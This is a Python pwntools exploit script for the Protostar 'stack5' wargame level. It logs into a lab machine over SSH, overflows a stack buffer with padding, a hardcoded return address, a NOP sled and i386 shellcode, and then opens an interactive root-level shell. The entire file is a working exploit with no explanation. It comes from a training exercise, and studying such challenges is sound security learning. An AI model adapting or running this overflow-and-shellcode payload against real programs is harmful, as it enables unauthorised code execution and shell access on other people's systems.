#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template stack5
from pwn import *
import struct
context.arch = 'i386'

s = ssh(host='192.168.12.128', user='user', password='user')
sh = s.run('/opt/protostar/bin/stack5')
payload = b"A"*76
payload += p32(0xbffffcc0)
payload += b"\x90"*4*80
#payload += p32(0xdeadbeef)
payload += asm(shellcraft.i386.linux.sh())

f = open('/tmp/foo', 'wb')
f.write(payload)
f.close()

sh.sendline(payload)
sh.interactive()
s.close()


